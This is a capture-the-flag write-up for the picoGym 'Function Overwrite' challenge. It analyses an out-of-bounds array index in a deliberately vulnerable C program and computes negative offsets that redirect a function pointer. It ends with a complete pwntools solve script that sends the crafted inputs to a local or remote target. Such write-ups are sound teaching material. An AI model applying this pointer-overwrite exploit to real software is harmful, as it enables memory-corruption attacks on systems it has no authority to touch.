---
slug: function_overwrite
title: Function Overwrite
authors: [nguyen]
tags: [Binary Exploitation]
---

Function Overwrite

You can point to all kinds of things in C.

Hint: Don't be so negative

<!--truncate-->

## The Challenge

Executable can be downloaded [here](/files/function_overwrite/vuln) (Right click and open in new tab).

Source code [here](/files/function_overwrite/vuln.c)

The goal of this challenge is to get the flag.

## Analysis

The source code was provided so I went ahead and took a look into it to determine insecure code. On line 82, there is an if statement that references an index of an array based on user input. We can use this to access memory outside the bounds of the array. The array is declared right below a function pointer that is set to `hard_checker`.

## The Solve

Using GDB, I determined the offset from the array `fun` to the `check` function pointer.

![Addresses](/img/function_overwrite/check_fun_addrs.png)

The offset is 0x40 so fun is 64 bytes, or 16 ints, away. In order to modify the value of check to be set to easy_checker, we need to determine the value for `num2` to add to the address of hard_checker.

- Hard check = 0x8049436
- Easy check = 0x80492fc

0x8049436 - 0x80492fc = 0x13A = 314 bytes

We can set `num1` to -16 and `num2` to -314.

For the last piece of the challenge, we need a string where the sum of the values of each character equals `1337`. We have a buffer of up to 127 characters. We can use the highest value character `~` to make as small a string as possible. 

"~" = 126

1337 / 126 = 10.61111111111111

We can use 10 "~" which leaves us with 1337 - (10 * 126) = 77

77 = "M"

The string `~~~~~~~~~~M` = 1337

## Script

```python
#!/usr/bin/env python3

"""
Toast's submission for the picoGym challenge function overwrite.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('addr', 4141)

    else:
        io = process([exe.path])

    return io


def main():
    '''Return the flag.
    '''

    with conn() as io:
        flag = get_flag(io)
        log.success(f"Flag is: {flag}")


def get_flag(io):
    scanf_to_check_offset = -16
    fun_to_check_offset = -314
    io.sendline(b'~~~~~~~~~~M')
    io.recvline()
    io.sendline(b'-16 -314')
    io.recvline()
    flag = io.recvline()
    return flag.decode()


if __name__ == '__main__':
    main()
```
